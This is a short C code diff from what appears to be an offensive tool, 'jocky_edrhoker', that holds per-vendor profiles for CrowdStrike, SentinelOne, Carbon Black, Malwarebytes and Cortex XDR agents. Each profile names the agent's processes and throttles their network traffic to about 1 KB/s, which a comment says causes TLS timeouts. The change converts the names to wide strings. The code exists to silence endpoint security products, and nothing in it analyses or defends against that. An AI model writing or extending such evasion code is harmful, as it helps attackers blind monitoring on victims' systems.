@@ -233,8 +233,8 @@ int jocky_edrhoker_apply_profile(const EDR_PROFILE* profile)
 int jocky_edrhoker_profile_crowdstrike(void)
 {
     EDR_PROFILE profile = {0};
-    profile.names[0] = "csagent.exe";
-    profile.names[1] = "cgagent.exe";
+    profile.names[0] = L"csagent.exe";
+    profile.names[1] = L"cgagent.exe";
     profile.count = 2;
     profile.throttle_kbps = 1;  /* ~1 KB/s - causes TLS timeouts */
 
@@ -244,8 +244,8 @@ int jocky_edrhoker_profile_crowdstrike(void)
 int jocky_edrhoker_profile_sentinelone(void)
 {
     EDR_PROFILE profile = {0};
-    profile.names[0] = "SentinelAgent.exe";
-    profile.names[1] = "SentinelAgentWorker.exe";
+    profile.names[0] = L"SentinelAgent.exe";
+    profile.names[1] = L"SentinelAgentWorker.exe";
     profile.count = 2;
     profile.throttle_kbps = 1;
 
@@ -255,8 +255,8 @@ int jocky_edrhoker_profile_sentinelone(void)
 int jocky_edrhoker_profile_carbonblack(void)
 {
     EDR_PROFILE profile = {0};
-    profile.names[0] = "cb.exe";
-    profile.names[1] = "repair_tool.exe";
+    profile.names[0] = L"cb.exe";
+    profile.names[1] = L"repair_tool.exe";
     profile.count = 2;
     profile.throttle_kbps = 1;
 
@@ -266,8 +266,8 @@ int jocky_edrhoker_profile_carbonblack(void)
 int jocky_edrhoker_profile_mbeddr(void)
 {
     EDR_PROFILE profile = {0};
-    profile.names[0] = "MBAMService.exe";
-    profile.names[1] = "mupdate.exe";
+    profile.names[0] = L"MBAMService.exe";
+    profile.names[1] = L"mupdate.exe";
     profile.count = 2;
     profile.throttle_kbps = 1;
 
@@ -277,8 +277,8 @@ int jocky_edrhoker_profile_mbeddr(void)
 int jocky_edrhoker_profile_cortex(void)
 {
     EDR_PROFILE profile = {0};
-    profile.names[0] = "CortexXDRAgentForWindows.exe";
-    profile.names[1] = "logd.exe";
+    profile.names[0] = L"CortexXDRAgentForWindows.exe";
+    profile.names[1] = L"logd.exe";
     profile.count = 2;
     profile.throttle_kbps = 1;
 
